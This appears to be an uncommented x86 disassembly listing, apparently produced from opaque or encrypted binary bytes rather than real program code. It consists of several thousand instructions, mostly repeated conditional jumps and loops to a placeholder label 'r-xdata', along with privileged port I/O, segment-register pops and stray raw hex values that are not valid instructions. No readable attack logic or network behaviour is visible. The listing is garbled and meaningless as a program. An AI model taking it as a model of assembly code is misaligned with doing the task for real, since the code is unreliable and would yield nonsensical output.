mov ch [ ebx - 0x4a83ce97 ]
imul esp [ edx + esi * 8 + 0x1d3ae50a ] 0x1d
mov dl 0x69
and al 0xa
mov al 0x35
sbb eax 0xd0bbb1d
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
loop r-xdata
sub esp [ ecx ]
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
fadd st6
jb r-xdata
jb r-xdata
inc ebp
stc
or esi [ edx + ecx ]
or al [ esi + edi + 0x1d ]
sbb eax 0xb1ee2661
mov al ah
imul eax ecx 0xb
jb r-xdata
mov ah dh
jecxz r-xdata
pop edx
or esi [ ecx - 0x3f ]
dec esi
call 0x72b88dde
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x3a69eeb5
popad
sbb [ 0x15bb67ed ] ebx
sbb eax 0xb22d11d
inc esp
sbb eax 0xee26611d
mov cl 0x88
loopne r-xdata
mov eax 0x1d3e310b
imul esi [ edi - 0x717747f0 ] 0xffffff84
imul esi [ edi - 0x7bcd96d6 ] 0x6b
mov bh 0x28
mov edi 0x16af6b1e
jb r-xdata
test [ ebx - 0x61 ] ch
sbb cl [ eax + 0x1fe30bb4 ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0xbee2661
jb r-xdata
into
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ebp eax
jb r-xdata
or esi [ ecx + 0x72e2e2e7 ]
cmpsd [ esi ] [ edi ]
or bh [ edx + 0x6b848c88 ]
scasd [ edi ]
out dx al
sbb eax 0x40b96b5
in al dx
jb r-xdata
jb r-xdata
imul esp [ edi - 0x184ef500 ] 0xffffffe2
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
push ds
sub esp [ ecx ]
jb r-xdata
pop esi
loop r-xdata
xchg edi eax
out dx al
in eax dx
jb r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
cmp eax 0x86611d1d
popad
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
or esp edx
jb r-xdata
rcl eax 0x1
loop r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
or bl [ ebx ]
shl edx cl
loop r-xdata
cmpsd [ esi ] [ edi ]
0xe06a0e63 0xe2e2
mov esi 0x72e2e2f6
jb r-xdata
mov ch 0xee
imul edi [ edx ] 0xed1d1961
mov ebx 0xd11d1d15
and cl [ ebx ]
jb r-xdata
retn 0xe2e2
or al [ esi ]
jb r-xdata
out dx al
jb r-xdata
sub bl [ bx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push cs
sbb eax 0x7272721d
in eax dx
jb r-xdata
cli
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
xchg esi eax
jb r-xdata
jb r-xdata
or ecx [ 0x72e2e2f0 ]
jb r-xdata
jb r-xdata
sub ecx [ bp + di ]
outsb
jb r-xdata
sbb eax 0xe2e24272
loop r-xdata
or esp [ esi - 0x3ce2e2ee ]
mov esi 0xfd0bf2c6
sbb eax 0x7272721d
sub esp [ edi + 0x22 ]
in eax dx
jb r-xdata
and [ edx + 0x72 ] esi
stosb [ edi ]
cmp [ 0x7272721d ] ebx
xchg dh al
jb r-xdata
jb r-xdata
push ds
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov bh 0x69
push cs
imul esp [ edi + 0x6a0e63ea ] 0xbe2e2e0
or dl [ eax ]
sbb eax 0x7272721d
jb r-xdata
mov cl 0x88
jb r-xdata
stc
jb r-xdata
and eax 0x721d1d1f
jb r-xdata
jb r-xdata
inc edx
pop ds
sbb eax 0x1db5b2b4
arpl bp ax
jb r-xdata
jb r-xdata
jg r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
pop ds
sbb eax 0xab50e97
in ax 0xe2
loop r-xdata
loop r-xdata
arpl bp ax
sbb eax 0xe2e20674
jb r-xdata
movsd [ edi ] [ esi ]
jecxz r-xdata
loop r-xdata
jb r-xdata
dec ebp
or dh [ 0xffffffffee8a1d1d ]
jb r-xdata
jb r-xdata
jb r-xdata
mov ch 0xb2
jb r-xdata
or ecx [ edi + 0x721d1d0d ]
jb r-xdata
lahf
jecxz r-xdata
push es
outsd
sbb eax 0x3fe30b1d
jb r-xdata
jb r-xdata
jecxz r-xdata
loop r-xdata
or esp esp
add bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
mov [ edx + 0x14af6b84 ] bl
jb r-xdata
jb r-xdata
mov dh 0xe2
jb r-xdata
sbb [ 0x6bb4bb1d ] ebx
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jecxz r-xdata
sar [ edx ] 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and dh [ ebp + esi * 4 + 0x6b1ea76b ]
jb r-xdata
sbb eax 0x1d0ba291
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x13cb66ed
sbb eax 0x8ae6881d
or edx esi
fsub st2
or edx [ eax ]
call 0x72b88c4c
imul esp [ edi - 0xc81f4ea ] 0x7272e2e2
jb r-xdata
jb r-xdata
and [ ebx - 0x4b ] edx
sbb eax 0x4dee8a1d
jb r-xdata
adc dh [ edx + 0x1a340bb5 ]
jb r-xdata
sbb eax 0xe2e26e74
sub esp [ es : ecx ]
jb r-xdata
mov ebp 0xe2f2770b
jb r-xdata
jb r-xdata
jb r-xdata
or bl [ 0x1d1d ]
or edx [ ebx ]
call 0x72b8ae10
jb r-xdata
sub al 0x30
or esp ebx
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
test [ ebx + 0x7272721d ] dh
jb r-xdata
mov ebp 0x549f6b84
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
or eax ecx
jb r-xdata
loop r-xdata
sbb eax 0xa66bb4bb
or edi [ esi + 0x721d1d01 ]
cmpsb [ esi ] [ edi ]
sbb eax 0x6bb4bb1d
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xa725721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb ah bl
push ds
imul esp [ edi + 0x1aa76b16 ] 0xb
jb r-xdata
jge r-xdata
mov ah 0xb5
imul esp [ edi + 0x16a76b1e ] 0x6b
jb r-xdata
mov [ 0xffffffffe2fb1d0b ] al
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x1db1b21d
imul ebp [ edi + 0x6b84bb1a ] 0xffffffaf
jb r-xdata
cmpsd [ esi ] [ edi ]
loop r-xdata
loop r-xdata
jb r-xdata
or eax [ eax + 0x72e2e2d2 ]
jb r-xdata
jb r-xdata
sbb eax 0xe2e26a74
cmpsd [ esi ] [ edi ]
mov dl 0x8a
in al 0xe2
loopne r-xdata
sbb eax 0x990bf2b5
std
loop r-xdata
jb r-xdata
mov ebx 0xe2f00d0b
cmpsd [ esi ] [ edi ]
sbb cl [ ebx ]
xor ecx [ eax ]
sbb eax 0x7272721d
jb r-xdata
mov ch dh
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x6f
mov ah dl
loop r-xdata
push ds
loope r-xdata
jb r-xdata
jb r-xdata
imul esp [ edi - 0x6e7745f0 ] 0xffffffbc
test [ ebx - 0x59 ] ch
push ss
mov [ esi + 0x2b0b2469 ] bh
ja r-xdata
jb r-xdata
out 0xe2 eax
loop r-xdata
mov ah 0xb4
mov ah 0x6f
sbb eax 0x67ed7272
movsb [ edi ] [ esi ]
xchg edi eax
push ss
or eax [ esp + ebp * 8 ]
sbb eax 0x676fb11d
sub bl [ edi ]
sbb eax 0x676fb21d
push esi
sbb bl [ 0xffffffffb41db21d ]
0x676f
bound ebx [ edi + 0x67ede3f2 ]
sub al 0x30
aas
jb r-xdata
xchg edi eax
0xe66ae468 0xd1db
popad
jb r-xdata
jb r-xdata
jpo r-xdata
shr [ ebx ] 0x1
and ch ch
sbb eax 0x72727272
jb r-xdata
outsb
0x88e2e2e2 0x1de2
dec edx
push edx
jb r-xdata
jb r-xdata
mov [ edi - 0x60947b43 ] dl
pop esi
imul ebx [ ebx + ecx ] 0xe2e2ecb7
imul ebx [ edi - 0x425077ac ] 0xffffff84
imul ebx [ edi - 0x7be796a6 ] 0x6b
lahf
pop eax
arpl [ esi + ebx * 2 - 0x1e ] bx
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x88
jecxz r-xdata
jb r-xdata
adc al 0x69
sub cl [ ebx ]
hlt
scasd [ edi ]
jb r-xdata
cmp bl [ 0xffffffffa725721d ]
jb r-xdata
jb r-xdata
imul esi [ edx ] 0xe2f73e0b
loop r-xdata
mul edx
jb r-xdata
mov esi 0x721d1d01
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add [ 0x7272721d ] ebx
jb r-xdata
jb r-xdata
pop ds
outsd
cmpsd [ esi ] [ edi ]
xor dh [ edx + esi * 4 + 0x1d3edb0a ]
sbb eax 0x7272721d
jb r-xdata
cmpsd [ esi ] [ edi ]
push ss
jb r-xdata
sub bl [ edi ]
sbb eax 0x4e676f1d
adc al 0x1d
sbb eax 0xe2f8960a
loop r-xdata
test [ ebx - 0x61 ] ch
outsd
jb r-xdata
sbb eax 0x72e2e2fb
jb r-xdata
xchg ecx eax
jb r-xdata
jb r-xdata
or ecx [ esi - 0x18 ]
sub [ eax + 0x1d3e310b ] bh
loop r-xdata
out 0x6f al
cmpsd [ esi ] [ edi ]
sub dh [ edx - 0x1d1379f5 ]
loop r-xdata
mov cl 0xb1
jb r-xdata
jb r-xdata
popad
mov [ es : 0xffffffff81821c8a ] al
lgs ebp [ ebx - 0x5c ]
test [ edx ] 0x14
xor eax 0x668a1d1d
cmpsd [ esi ] [ edi ]
or [ edx + 0x1d12ad0b ] bh
sbb eax 0x72727272
jb r-xdata
mov [ edi + 0xaa76b84 ] al
mov edx 0x6b848c88
jb r-xdata
outsd
jb r-xdata
jb r-xdata
outsd
loop r-xdata
mov [ 0xffffffffc6e66bfa ] al
and ch ch
imul esp [ edi + 0x1ea7691a ] 0xffffffd9
cmpsd [ esi ] [ edi ]
sbb ch ch
jpe r-xdata
jb r-xdata
mov ah 0x88
retn 0xb4b4
or esi [ edi - 0xe ]
jb r-xdata
into
sbb eax 0x10560a1d
jb r-xdata
mov dh 0x19
sbb eax 0x1db4b21d
loop r-xdata
jb r-xdata
and bl [ 0x7272721d ]
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb eax 0x36676fb2
pop ds
sbb eax 0x170ab21d
pop ecx
sbb eax 0xf226611d
sub esp [ ecx ]
outsd
out 0xe2 eax
enter 0x1d13 0x1d
jb r-xdata
jb r-xdata
loop r-xdata
std
mov ch ch
jb r-xdata
sbb eax 0x72727272
outsd
imul esp [ edi + 0x72212b1e ] 0x72727272
mov [ edi - 0x60947b43 ] ch
pop edx
imul ebx [ eax ] 0x589f6b84
test [ ebx - 0x61 ] ch
push esp
jb r-xdata
sbb eax 0xed1d671d
jb r-xdata
pushad
in eax dx
jb r-xdata
push ss
imul edi [ edi - 0x7bc396e6 ] 0x6b
mov edi 0xb3a6918
in eax dx
test [ ebx - 0x49 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
fdivr st7
loop r-xdata
xchg esi eax
xor al 0xe3
imul ebp [ edx ] 0x1d1ff40b
sbb eax 0x72727272
jb r-xdata
sbb eax 0x1ea72572
jb r-xdata
or ah dl
sbb eax 0x751db21d
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
sbb eax 0x69727272
jb r-xdata
jb r-xdata
sbb eax 0x6f6fb21d
push esi
sbb bl [ 0x3b9c0a1d ]
movsw [ edi ] [ esi ]
salc
loop r-xdata
or eax [ ebx + ecx + 0x66ed1d1d ]
and edi [ 0xffffffff86611d1d ]
sub cl [ ebx ]
aam 0xce
loop r-xdata
popad
imul esp [ edi + 0x1f7d0b1a ] 0x1d
sbb eax 0x72727272
jb r-xdata
jb r-xdata
pop ds
jb r-xdata
loop r-xdata
imul ebx [ edi + 0xb1c6912 ] 0x7d
cli
loop r-xdata
jb r-xdata
or ebx [ 0x72e2e2fb ]
jb r-xdata
mov edi 0x72727221
jb r-xdata
and al 0xa7
push cs
or edx ecx
push cs
pop ds
sbb eax 0xe38ab21d
loop r-xdata
sbb eax 0xaf69ee97
0xe2e48f0b 0x72e2
push ebx
loop r-xdata
jb r-xdata
pop ds
sbb eax 0x106a0a1d
push edx
jb r-xdata
popad
fsub st2
or ecx eax
mov ah 0xb4
mov ah 0xb4
mov ah 0xb
jpo r-xdata
loop r-xdata
loop r-xdata
pop ds
jb r-xdata
imul esp esi 0x7221bbc6
jb r-xdata
imul esp esi 0xffffffc6
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0xed22671d
or dl [ esi + 0x10 ]
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
out dx al
imul esp [ edi - 0x794de216 ] 0x1a612bd1
sbb eax 0xb2377ed
jns r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul ebx [ eax ] 0x6b849a88
lahf
push esi
test [ ebx - 0x61 ] ch
push eax
pop esp
or edi eax
sbb eax 0x204a67ed
jb r-xdata
jb r-xdata
loop r-xdata
mov bh 0x82
jb r-xdata
jb r-xdata
adc esi [ eax ]
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
and ebp ebp
jb r-xdata
jb r-xdata
or ecx [ ecx - 0x3c ]
scasd [ edi ]
push ss
mov ebx 0x6b849a88
jb r-xdata
or esi esp
jb r-xdata
and eax 0xe2e31ea7
mov dl 0x1d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xab76f72
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
sbb cl [ ebx ]
mov ch dl
or dl [ esi + 0x69e2e2f8 ]
jb r-xdata
sti
jb r-xdata
0xb16971d 0xe4b
jb r-xdata
shl edx 0xe2
jb r-xdata
jb r-xdata
sbb [ ebp + ebx + 0x1d ] 0x72727272
jb r-xdata
sbb eax 0x107c0a1d
jb r-xdata
jb r-xdata
mov ah 0xb
sbb eax 0x9f6f721d
pop edx
outsd
outsd
push edx
pop ds
jb r-xdata
lahf
jb r-xdata
or edi ecx
out 0xe2 eax
loop r-xdata
sbb eax 0x1d107c0a
jb r-xdata
sub esp [ ecx ]
test [ ebx - 0x59 ] ch
adc [ edx - 0x7b436e78 ] bh
imul esp [ edi + 0x69be8816 ] 0x24
or ebp [ ebx ]
loop r-xdata
jb r-xdata
adc [ 0xffffffffed22671d ] bl
pop esp
sbb eax 0xd861841d
loop r-xdata
adc eax 0xe60bb51b
sub eax 0x72721d1d
in eax dx
movsb [ di ] [ si ]
jb r-xdata
jb r-xdata
sbb [ 0x1db4b21d ] ebx
sbb eax 0x7272721d
jb r-xdata
push esi
jb r-xdata
jb r-xdata
sbb [ 0x2267bb1d ] ebx
in eax dx
stosd [ di ]
pop ds
sbb eax 0x3420b1d
sbb eax 0x7272721d
test [ ebx - 0x59 ] ch
add al 0xba
or edx [ eax + 0x2d ]
sbb eax 0x66ed721d
0x8a1d1d3a 0xbbcd
pop es
jl r-xdata
mov ah 0xa
cwde
pop ebp
sbb eax 0xee26611d
and [ 0xffffffffed1d671d ] bl
jb r-xdata
in eax dx
and [ 0xfffffffff2a16f1d ] bl
dec edx
jb r-xdata
jb r-xdata
loop r-xdata
mov eax 0x6b848088
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
out 0xc6 al
jb r-xdata
mov dl 0x6f
jb r-xdata
jb r-xdata
mov al al
jb r-xdata
outsd
jb r-xdata
pop ds
sbb eax 0x7272721d
mov ebx 0x66ed2267
xchg al bh
loop r-xdata
mov edx 0x9c0bc788
loop r-xdata
jne r-xdata
jb r-xdata
push ds
dec ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xe2e20274
jb r-xdata
popfd
cmp [ 0xe120b1d ] bl
or bl [ edi + 0x18 ]
outsd
jb r-xdata
arpl [ esi ] cx
sbb eax 0x1a61bb1d
jecxz r-xdata
je r-xdata
sbb eax 0xe2e24e74
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
xchg edi eax
jb r-xdata
loop r-xdata
jb r-xdata
or cl [ eax + 0x6b84bd8f ]
jb r-xdata
test [ ebx - 0x61 ] ch
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x67ed2267
hlt
or bh [ eax + edx + 0x1d ]
jb r-xdata
loop r-xdata
sbb eax 0x67ed2267
jb r-xdata
mov [ 0xffffffff881d1d5a ] ax
jb r-xdata
jb r-xdata
or cl [ esi ]
pop eax
sbb eax 0xee26611d
and ch ch
mov dl 0xb
shr [ ebx ] cl
sbb eax 0x7272721d
jl r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
or esp [ edi - 0x1e ]
sbb eax 0x55edfeb5
movsb [ edi ] [ esi ]
in al 0xb
popfd
sub [ 0x7272721d ] bl
mov dl dl
imul ebp [ edx ] 0x72721d1d
jb r-xdata
sbb eax 0x67ed1d67
jb r-xdata
sbb eax 0xf2a16f1d
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
mov [ ebp - 0x58947b48 ] al
add [ ebx + ebp * 2 - 0x7b477f49 ] 0x6b
mov bh 0x86
jb r-xdata
mov al ah
outsd
scasd [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0xbc0bfa97
in al dx
loop r-xdata
jb r-xdata
mov cl 0xb
adc al 0xc1
loop r-xdata
jb r-xdata
imul esp esi 0x7221bbc6
jb r-xdata
jmp edx
mov bl ah
or ebx eax
loop r-xdata
or esi [ ebx ]
loop r-xdata
sbb [ 0x751db21d ] ebx
mov dl 0x6f
and dh [ edx - 0x27f41c78 ]
cmp al 0xb
push esi
shl [ edx ] 0x1
mov [ 0xffffffffe2f8bc0b ] al
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
xor cl [ ebx ]
mul edx
shl al cl
loop r-xdata
push cs
sbb eax 0x1ec10a1d
mov bh 0xea
outsd
sub bl [ bx ]
jb r-xdata
mov ah 0xb
xor al 0xc2
mov [ ebx + ecx + 0x1d1d10a7 ] dl
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
or cl [ edx ]
jb r-xdata
mov cl 0xb4
pop esp
into
loop r-xdata
loop r-xdata
mov edi 0x721d1d3b
jb r-xdata
adc ch [ ecx + 0x1c ]
or edi [ ebp - 0x6 ]
lahf
mov ebx 0x67ed2267
mov ah 0x3d
jb r-xdata
or ecx [ ebx + 0xe ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb [ eax ] esi
jb r-xdata
jb r-xdata
lahf
jb r-xdata
or [ eax + 0x6b84bd8a ] cl
lahf
mov ebp 0xa9f6b84
jb r-xdata
jb r-xdata
jb r-xdata
hlt
adc [ 0xffffffffed22671d ] bl
jb r-xdata
and ch ch
jb r-xdata
pop esp
jb r-xdata
sbb eax 0x72727272
jb r-xdata
pop edx
sbb eax 0xba8d881d
jb r-xdata
jb r-xdata
sbb eax 0xed22671d
mov bh 0xb
mov [ 0x721d1d07 ] eax
adc ebx [ 0x7272721d ]
jb r-xdata
sbb esi [ ebp + 0x1d2de60b ]
sbb eax 0x72727272
loop r-xdata
jb r-xdata
push edx
sub ch [ edi + 0x6f ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xb51d0697
sbb eax 0x204a67ed
jb r-xdata
outsd
jb r-xdata
imul esi [ edi + 0x6b84b880 ] 0xffffffb7
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov [ esi + 0x10af6b84 ] dl
mov ebx 0x6b84cc88
sbb eax 0xe2e24675
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and bh [ ebx + ecx - 0x1d1d104c ]
jb r-xdata
jb r-xdata
mov dl 0x6f
jb r-xdata
mov bh 0xa
cmpsd [ esi ] [ edi ]
push ds
jb r-xdata
sbb eax 0xa751db2
jb r-xdata
popad
jb r-xdata
mov esp 0xe2efb40b
loop r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
xchg esi eax
test [ ebx - 0x51 ] ch
adc [ ebx + 0x6b84cc88 ] bh
pop edi
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
fwait
sahf
sbb eax 0x7272721d
jb r-xdata
test [ ebx - 0x61 ] ch
jb r-xdata
mov [ edi - 0x60947b43 ] cl
jb r-xdata
imul ebx [ edi - 0x427077f6 ] 0xffffff84
imul ebx [ edi + 0x6b84bd00 ] 0xffffff9f
jb r-xdata
jb r-xdata
outsd
jb r-xdata
or esp [ ebx + 0x721d1d07 ]
jb r-xdata
jb r-xdata
test [ ebx - 0x5c ] ch
sbb eax 0xb2bb5a1d
jb r-xdata
sbb eax 0xbba8d88
sbb al [ ebx + 0x7272721d ]
jb r-xdata
jb r-xdata
imul esp [ edi + 0x1ea7691e ] 0xffffffe1
cmpsd [ esi ] [ edi ]
loop r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmp [ 0x7272721d ] bl
or edi eax
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
outsd
jb r-xdata
xchg edi eax
movsb [ edi ] [ esi ]
salc
or esp [ esi - 0x11 ]
loop r-xdata
sbb eax 0x104c0a72
sbb eax 0x2267bb1d
jb r-xdata
jb r-xdata
mov al [ 0x45f7be6a ]
popad
sbb al 0xc2
jb r-xdata
sbb eax 0xf60b67ed
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
adc [ 0x7272721d ] bl
sbb eax 0xa70b9488
xchg esi eax
outsd
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul ebp [ edi + 0x160f0bee ] 0x6f721d1d
jb r-xdata
sbb eax 0xe2e20a75
jb r-xdata
jb r-xdata
sbb eax 0xe2e26274
loop r-xdata
0xf7be6aa0 0x6145
jb r-xdata
loop r-xdata
jb r-xdata
mov ah 0xef
loop r-xdata
sbb eax 0x7272721d
or bl [ ebp + 0xb1d1d38 ]
sbb eax 0xb94881d
jb r-xdata
cmp [ ebx + ecx + 0x1d1d07b0 ] esi
jb r-xdata
jb r-xdata
and ch ch
mov ah 0x3d
out 0xe3 al
loop r-xdata
loop r-xdata
jb r-xdata
or dh [ edx + 0xb1d1d36 ]
or esi [ ebx ]
or bl [ 0xffffffffb172721d ]
loop r-xdata
jb r-xdata
jb r-xdata
lahf
or dh cl
push cs
mov [ ebp + 0x1d18d60b ] al
sbb eax 0x72727272
jb r-xdata
mov ebp 0x89f6b84
mov [ edx - 0x60947b43 ] cl
jb r-xdata
jb r-xdata
or ebx [ ecx ]
jb r-xdata
add [ ebp + 0xa9f6b84 ] bh
jb r-xdata
jb r-xdata
mul [ es : edi + 0x22 ]
jb r-xdata
pop edx
jb r-xdata
pop sp
jb r-xdata
lea edi [ edx + 0x1d041a0b ]
jb r-xdata
sbb eax 0x25000b1d
lahf
jb r-xdata
jb r-xdata
into
jb r-xdata
sbb eax 0xed22671d
mov bx 0x1d32
sbb eax 0x130b22d1
nop [ 0x72727272 ] ebx
jb r-xdata
or ch [ edx + 0x10 ]
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
clc
jb r-xdata
jb r-xdata
or edx [ ebx ]
loop r-xdata
jb r-xdata
and ah dl
jb r-xdata
out 0xc6 al
arpl [ esi ] cx
dec esi
out 0xe2 al
loop r-xdata
jb r-xdata
imul ecx [ esi ] 0x8ae688b5
or esi [ edi + ebp * 8 + 0x7272e2e2 ]
jb r-xdata
sbb [ 0x751db21d ] ebx
or eax ebp
or ah dl
mov dh 0x19
and al 0xea
mov esi 0x1c6145f7
retn 0x60ed
in eax dx
pushad
or edi [ edi ]
mul dl
loop r-xdata
or ecx [ eax - 0x14 ]
cmpsd [ esi ] [ edi ]
push ds
loope r-xdata
jb r-xdata
mov esi 0xb21d1d1f
rcl [ esp + esi * 4 ] 0x1
sbb eax 0x6e0baeb5
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
out dx al
or ecx [ edi ]
push ss
jb r-xdata
jb r-xdata
in eax dx
sbb eax 0xa721d1d
jb r-xdata
loop r-xdata
sbb ah [ edi + 0x1d ]
in eax dx
or esi esi
push edx
push 0xffffffbe
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
shl dl 0x1
loop r-xdata
outsd
sbb eax 0x7272721d
jb r-xdata
imul ebp [ edi + 0xb808818 ] 0x6c
push ds
movsb [ edi ] [ esi ]
salc
mov dl 0xb
pop edx
cld
loop r-xdata
mov dh ah
jb r-xdata
sbb eax 0x1d5bd90a
jb r-xdata
jb r-xdata
mov dl 0x36
sbb eax 0x30190b1d
test [ ebx - 0x49 ] ch
pop esp
mov eax 0x6b848d88
mov bh 0x22
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x6f
imul ebx [ edi - 0x427577f8 ] 0xffffff84
imul ebx [ edi + 0xb85880e ] 0xffffffd6
jb r-xdata
xor [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
and ch ch
jb r-xdata
jb r-xdata
loop r-xdata
mov dl 0xe2
jb r-xdata
pop esp
jb r-xdata
or ebx [ edx ]
jb r-xdata
mov ah 0xa
fldcw [ eax ]
loop r-xdata
outsd
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x2472721d
cmpsd [ esi ] [ edi ]
sbb eax 0xe7ce0ae2
loop r-xdata
mov dl 0xb5
or esi [ edx + ebx ]
imul esp edx 0x6bfaa269
out 0xc6 al
je r-xdata
sbb eax 0xbf2a16f
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or edi [ edi + 0x72e2e2f4 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
adc esi edx
loop r-xdata
outsd
loop r-xdata
jb r-xdata
add [ 0x1ea71d1d ] ebx
mov ch 0xb
add eax [ 0x676f1d1d ]
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
loop r-xdata
sbb eax 0xb1ea71d
dec eax
jb r-xdata
into
outsb
or ebx esp
xor bl [ ebx - 0x629e8de3 ]
retn 0xbe3
mov [ 0xffffffffc6e66bfa ] al
jb r-xdata
loop r-xdata
and ah dl
jb r-xdata
jb r-xdata
jb r-xdata
movhps xmm3 [ 0xffffffffb76f721d ]
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebp + 0x61 ] 0x60edc21c
fldenv [ esi + edx * 8 - 0x1d1099f5 ]
loop r-xdata
loop r-xdata
or ebp [ esi - 0x32 ]
loop r-xdata
jb r-xdata
or esp [ edi + 0x721d1d10 ]
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
push ds
sar [ ecx ] 0x1
test [ ebx - 0x41 ] ch
sbb al 0xb
lodsb [ esi ]
shl edx 0x1
loop r-xdata
outsd
imul esp [ edi + 0x16971dea ] 0x1d0e4b0b
sbb eax 0x72727272
jb r-xdata
push 0xd1e2e2ec
loop r-xdata
sbb eax 0x1dee2661
jne r-xdata
fstp [ ebx + 0x1d ]
mov ch 0x6b
movsb [ edi ] [ esi ]
0x1d36e50a 0x8a1d
jb r-xdata
and cl [ ebx ]
mov eax 0x721d1d59
fldcw [ ecx ]
jb r-xdata
or edi [ eax + 0x721d1d59 ]
or bl [ esi + 0x61e2e2e1 ]
jb r-xdata
lahf
jb r-xdata
out 0x66 eax
loop r-xdata
cmp [ 0xffffffffc6a6691d ] ebx
sbb eax 0xe266e7d2
loop r-xdata
int1
sbb eax 0x72727272
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
and eax 0xe28813a7
mov dl ah
and eax 0xe28817a7
xor edi [ esi ]
jb r-xdata
loop r-xdata
or ebp [ edx ]
jb r-xdata
imul esp [ edx + ebp * 8 + 0xbf2a769 ] 0xffffff9d
loope r-xdata
loop r-xdata
jb r-xdata
sbb eax 0xe2b2bb5a
jb r-xdata
add al 0x1d
jb r-xdata
or eax [ ecx + 0x721d1d5c ]
xor [ edi ] 0x646b1d1d
push esi
loop r-xdata
mov ah 0xb4
or edi [ ebx + 0x11 ]
outsd
jb r-xdata
loop r-xdata
mov eax [ 0x38f80bf2 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
hlt
jb r-xdata
imul ebp [ edi - 0x7b4f44f6 ] 0x6b
scasd [ edi ]
mov [ edx + 0x65e0bb8 ] bl
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ecx [ ebp + 0x39 ]
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
loop r-xdata
or bl [ ebx - 0x2e1d1d0b ]
